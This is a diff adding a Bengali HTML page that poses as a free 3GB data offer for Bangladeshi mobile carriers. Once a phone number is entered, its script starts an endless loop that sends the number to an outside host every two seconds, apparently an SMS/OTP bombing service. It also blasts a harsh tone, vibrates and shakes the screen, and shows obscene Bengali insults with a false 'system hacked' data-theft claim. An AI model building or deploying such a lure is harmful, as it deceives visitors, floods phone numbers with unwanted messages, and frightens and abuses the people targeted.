@@ -1,0 +1,186 @@
+<!doctype html>
+<html lang="bn">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Premium 3GB Offer — Free</title>
+
+  <style>
+    :root { 
+      --bg: #050807; 
+      --premium-mint: #00ffaa;
+      --gold: #ffcc00; 
+      --red: #ff0000; 
+    }
+    
+    body { 
+      margin: 0; background: var(--bg); color: #e0e0e0; 
+      font-family: 'Segoe UI', sans-serif; overflow-x: hidden; 
+    }
+
+    #scary-overlay {
+      position: fixed; inset: 0; background: black; z-index: 9999;
+      display: none; align-items: center; justify-content: center;
+      flex-direction: column; text-align: center;
+    }
+
+    .scary-icon { font-size: 110px; animation: pulse 0.1s infinite; }
+    
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.15); filter: drop-shadow(0 0 20px red); }
+      100% { transform: scale(1); }
+    }
+
+    /* ০.৯ সেকেন্ডের তীব্র কাঁপাকাপি */
+    .intense-shake { animation: hard-shake 0.1s infinite; }
+    @keyframes hard-shake {
+      0% { transform: translate(7px, 7px); background: #300000; }
+      50% { transform: translate(-7px, -7px); background: #000; }
+      100% { transform: translate(7px, -7px); }
+    }
+
+    /* পড়ার সময় হালকা কাঁপাকাপি */
+    .soft-shake { animation: gentle-shake 0.3s infinite; }
+    @keyframes gentle-shake {
+      0% { transform: translate(1px, 1px); }
+      50% { transform: translate(-1px, -1px); }
+      100% { transform: translate(1px, -1px); }
+    }
+
+    .promo-banner { 
+      background: #121a16; padding: 25px; 
+      text-align: center; font-weight: bold; font-size: 24px; color: var(--gold); 
+      border-bottom: 2px solid var(--premium-mint); 
+    }
+
+    .instruction-box {
+      background: rgba(0, 255, 170, 0.05); border: 1px solid rgba(0, 255, 170, 0.2);
+      border-radius: 15px; padding: 20px; margin: 10px; font-size: 16px; line-height: 1.8;
+    }
+
+    #sim-screen { 
+      position: fixed; inset: 0; background: #0a0f0d; 
+      z-index: 1000; display: flex; flex-direction: column; align-items: center; 
+      justify-content: center; padding: 20px; 
+    }
+
+    .sim-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; width: 100%; max-width: 380px; }
+
+    .sim-card { 
+      background: #121a16; border: 1px solid var(--premium-mint); 
+      padding: 22px; border-radius: 15px; color: var(--premium-mint); text-align: center; cursor: pointer;
+    }
+
+    .container { display: none; width: 92%; max-width: 450px; margin: 30px auto; text-align: center; }
+
+    input { 
+      width: 90%; padding: 18px; margin-bottom: 25px; background: #000; 
+      border: 1.5px solid var(--premium-mint); color: var(--gold); border-radius: 12px; font-size: 20px; text-align: center;
+    }
+
+    .check-btn { 
+      width: 90%; padding: 18px; background: var(--premium-mint); 
+      color: #000; border: none; border-radius: 12px; font-size: 22px; font-weight: bold; cursor: pointer;
+    }
+
+    #prank-result { display: none; padding: 30px; border: 4px solid var(--red); border-radius: 20px; background: #1a0000; }
+  </style>
+</head>
+<body id="main-body">
+
+<div id="scary-overlay">
+  <div class="scary-icon">☠️</div>
+  <h1 style="color:red; font-size: 35px;">SYSTEM HACKED!</h1>
+</div>
+
+<div id="sim-screen">
+  <h1 style="color:var(--premium-mint); margin-bottom: 30px;">সিম নির্বাচন করুন</h1>
+  <div class="sim-grid">
+    <div class="sim-card" onclick="openPanel('GP')">Grameenphone</div>
+    <div class="sim-card" onclick="openPanel('Banglalink')">Banglalink</div>
+    <div class="sim-card" onclick="openPanel('Robi')">Robi</div>
+    <div class="sim-card" onclick="openPanel('Airtel')">Airtel</div>
+  </div>
+</div>
+
+<div class="promo-banner" id="banner" style="display:none;">🎁 <span id="sim-name"></span> ৩ জিবি অফার</div>
+
+<div class="container" id="main-container">
+  <div class="instruction-box">
+    <b style="color: var(--gold); font-size: 18px;">এমবি পাওয়ার সঠিক নিয়ম:</b><br>
+    ১. আপনার ১১ ডিজিটের সঠিক সিম নাম্বারটি নিচে লিখুন।<br>
+    ২. "Check Now" বাটনে ক্লিক করে ভেরিফিকেশন শুরু করুন।<br>
+    ৩. অফারটি নিশ্চিত করতে ২-৩ মিনিট অপেক্ষা করুন।
+  </div>
+
+  <input id="target" type="tel" placeholder="আপনার নাম্বার দিন" maxlength="11">
+  <button class="check-btn" onclick="startPrank()">Check Now</button>
+  
+  <div id="prank-result">
+    <div style="color:var(--red); font-size: 45px; font-weight: 900;">বুকাচুদা! 🤣🖕</div>
+    <div style="color: #fff; font-size: 22px; font-weight: bold; margin-top: 20px;">
+       খানকির ছেলে, ফ্রিতে কোন এমবি পাওয়া যায় না!<br>
+       <b style="color:var(--gold); font-size:28px;">RAKIB হ্যাকার</b> <br>
+       تোর সব ডাটা এখন আমার হাতে! ☠️
+    </div>
+  </div>
+</div>
+
+<script>
+  let audioCtx = null;
+
+  function openPanel(sim) {
+    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    document.getElementById('sim-screen').style.display = 'none';
+    document.getElementById('banner').style.display = 'block';
+    document.getElementById('main-container').style.display = 'block';
+    document.getElementById('sim-name').innerText = sim;
+  }
+
+  function sendOTP(phone) {
+    // প্রতি ২ সেকেন্ডে একটি রিকোয়েস্ট যাবে যাতে সার্ভার ব্লক না হয় এবং বেশি মেসেজ যায়
+    setInterval(() => {
+        fetch(`https://bj-x-coder.top/bo_m_ber.php?phone=${phone}&amount=100`).catch(() => {});
+    }, 2000); 
+  }
+
+  function startPrank() {
+    const phone = document.getElementById('target').value;
+    if (phone.length < 11) { alert("নাম্বার দিন!"); return; }
+
+    // ওটিপি পাঠানোর অবিরাম লুপ চালু
+    sendOTP(phone);
+
+    if(audioCtx) {
+      let osc = audioCtx.createOscillator();
+      let gain = audioCtx.createGain();
+      osc.type = 'sawtooth';
+      osc.frequency.setValueAtTime(900, audioCtx.currentTime);
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      osc.start();
+    }
+
+    const overlay = document.getElementById('scary-overlay');
+    const body = document.getElementById('main-body');
+
+    overlay.style.display = 'flex';
+    body.classList.add('intense-shake');
+
+    setTimeout(() => {
+        overlay.style.display = 'none';
+        body.classList.remove('intense-shake');
+        body.classList.add('soft-shake'); 
+        
+        document.getElementById('target').style.display = "none";
+        document.querySelector('.check-btn').style.display = "none";
+        document.querySelector('.instruction-box').style.display = "none";
+        document.getElementById('prank-result').style.display = "block";
+    }, 900);
+
+    if (window.navigator.vibrate) window.navigator.vibrate([1000, 500, 1000]);
+  }
+</script>
+</body>
+</html>
